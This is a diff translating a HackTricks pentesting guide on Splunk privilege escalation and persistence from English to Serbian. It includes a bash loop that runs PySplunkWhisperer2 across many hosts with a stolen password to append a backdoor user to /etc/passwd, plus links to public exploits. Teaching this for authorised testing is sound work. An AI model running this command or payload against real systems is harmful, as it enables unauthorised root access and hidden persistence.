@@ -1,52 +1,50 @@
-# Splunk LPE and Persistence
+# Splunk LPE i Persistencija
 
 {{#include ../../banners/hacktricks-training.md}}
 
-If **enumerating** a machine **internally** or **externally** you find **Splunk running** (port 8090), if you luckily know any **valid credentials** you can **abuse the Splunk service** to **execute a shell** as the user running Splunk. If root is running it, you can escalate privileges to root.
+Ako **enumerišete** mašinu **interno** ili **eksterno** i pronađete da **Splunk radi** (port 8090), ako srećom znate neke **validne kredencijale**, možete **iskoristiti Splunk servis** da **izvršite shell** kao korisnik koji pokreće Splunk. Ako ga pokreće root, možete eskalirati privilegije na root.
 
-Also if you are **already root and the Splunk service is not listening only on localhost**, you can **steal** the **password** file **from** the Splunk service and **crack** the passwords, or **add new** credentials to it. And maintain persistence on the host.
+Takođe, ako ste **već root i Splunk servis ne sluša samo na localhost**, možete **ukrasti** **datoteku** sa **lozinkama** **iz** Splunk servisa i **provaliti** lozinke, ili **dodati nove** kredencijale. I održati persistenciju na hostu.
 
-In the first image below you can see how a Splunkd web page looks like.
+Na prvoj slici ispod možete videti kako izgleda Splunkd web stranica.
 
-## Splunk Universal Forwarder Agent Exploit Summary
+## Pregled Eksploatacije Splunk Universal Forwarder Agenta
 
-For further details check the post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). This is just a sumary:
+Za više detalja pogledajte post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Ovo je samo sažetak:
 
-**Exploit Overview:**
-An exploit targeting the Splunk Universal Forwarder Agent (UF) allows attackers with the agent password to execute arbitrary code on systems running the agent, potentially compromising an entire network.
+**Pregled Eksploatacije:**
+Eksploatacija koja cilja Splunk Universal Forwarder Agenta (UF) omogućava napadačima sa lozinkom agenta da izvrše proizvoljan kod na sistemima koji pokreću agenta, potencijalno kompromitujući celu mrežu.
 
-**Key Points:**
+**Ključne Tačke:**
 
-- The UF agent does not validate incoming connections or the authenticity of code, making it vulnerable to unauthorized code execution.
-- Common password acquisition methods include locating them in network directories, file shares, or internal documentation.
-- Successful exploitation can lead to SYSTEM or root level access on compromised hosts, data exfiltration, and further network infiltration.
+- UF agent ne validira dolazne konekcije ili autentičnost koda, što ga čini ranjivim na neovlašćeno izvršavanje koda.
+- Uobičajene metode sticanja lozinki uključuju pronalaženje u mrežnim direktorijumima, deljenju datoteka ili internim dokumentima.
+- Uspešna eksploatacija može dovesti do pristupa na SISTEM ili root nivou na kompromitovanim hostovima, eksfiltraciju podataka i dalju infiltraciju u mrežu.
 
-**Exploit Execution:**
+**Izvršenje Eksploatacije:**
 
-1. Attacker obtains the UF agent password.
-2. Utilizes the Splunk API to send commands or scripts to the agents.
-3. Possible actions include file extraction, user account manipulation, and system compromise.
+1. Napadač dobija lozinku UF agenta.
+2. Koristi Splunk API za slanje komandi ili skripti agentima.
+3. Moguće akcije uključuju ekstrakciju datoteka, manipulaciju korisničkim nalozima i kompromitaciju sistema.
 
-**Impact:**
+**Uticaj:**
 
-- Full network compromise with SYSTEM/root level permissions on each host.
-- Potential for disabling logging to evade detection.
-- Installation of backdoors or ransomware.
+- Potpuna kompromitacija mreže sa SISTEM/root nivoom dozvola na svakom hostu.
+- Potencijal za onemogućavanje logovanja kako bi se izbegla detekcija.
+- Instalacija backdoora ili ransomware-a.
 
-**Example Command for Exploitation:**
-
+**Primer Komande za Eksploataciju:**
 ```bash
 for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
 ```
-
-**Usable public exploits:**
+**Iskoristive javne eksploatacije:**
 
 - https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
 - https://www.exploit-db.com/exploits/46238
 - https://www.exploit-db.com/exploits/46487
 
-## Abusing Splunk Queries
+## Zloupotreba Splunk upita
 
-**For further details check the post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**
+**Za više detalja pogledajte post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**
 
 {{#include ../../banners/hacktricks-training.md}}
